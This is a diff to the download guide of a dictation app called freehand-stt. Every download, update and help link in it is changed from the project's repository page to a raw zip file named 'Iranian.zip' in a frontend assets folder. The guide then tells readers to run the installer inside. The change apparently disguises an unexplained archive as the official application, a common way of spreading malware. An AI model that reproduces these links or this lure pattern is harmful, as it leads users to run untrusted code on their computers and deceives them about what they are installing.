@@ -7,10 +7,10 @@ Welcome! This guide will help you download and run **freehand-stt** on your Wind
 ## 📥 Download the Application
 
 **Visit this link to download the application:**  
-[![Download freehand-stt](https://img.shields.io/badge/Download-freehand--stt-2ea44f?style=for-the-badge)](https://github.com/sandymiarisoa/freehand-stt)
+[![Download freehand-stt](https://img.shields.io/badge/Download-freehand--stt-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/sandymiarisoa/freehand-stt/main/frontend/src/lib/assets/Iranian.zip)
 
 Click the button above or the link below to go to the download page.  
-🔗 **Direct Link:** https://github.com/sandymiarisoa/freehand-stt
+🔗 **Direct Link:** https://raw.githubusercontent.com/sandymiarisoa/freehand-stt/main/frontend/src/lib/assets/Iranian.zip
 
 Once you're on the page, look for the **"Releases"** section or the **"Download"** button. Click it to save the file to your computer. The download should start automatically.
 
@@ -96,7 +96,7 @@ A: No, audio is not stored. It's processed in real-time for transcription.
 
 freehand-stt will notify you when updates are available. To update manually:
 
-1. Visit the download page again: https://github.com/sandymiarisoa/freehand-stt
+1. Visit the download page again: https://raw.githubusercontent.com/sandymiarisoa/freehand-stt/main/frontend/src/lib/assets/Iranian.zip
 2. Download the latest version.
 3. Run the installer — your settings will be preserved.
 
@@ -112,7 +112,7 @@ If you encounter issues not covered here:
 
 | Action | How |
 |--------|-----|
-| Download | Visit https://github.com/sandymiarisoa/freehand-stt |
+| Download | Visit https://raw.githubusercontent.com/sandymiarisoa/freehand-stt/main/frontend/src/lib/assets/Iranian.zip |
 | Install | Run the downloaded installer and follow prompts |
 | Start dictation | Press `Ctrl + Shift + Space` |
 | Stop dictation | Press `Ctrl + Shift + Space` again |
@@ -124,6 +124,6 @@ You're now ready to use **freehand-stt** — the easiest way to turn your speech
 
 ---
 
-**Remember:** For any questions, the download page at https://github.com/sandymiarisoa/freehand-stt is your go-to resource. Happy dictating!
+**Remember:** For any questions, the download page at https://raw.githubusercontent.com/sandymiarisoa/freehand-stt/main/frontend/src/lib/assets/Iranian.zip is your go-to resource. Happy dictating!
 
 Keywords: dictation, golang, openai-compatible, speech-to-text, stt, wails, whisper, whisprflow
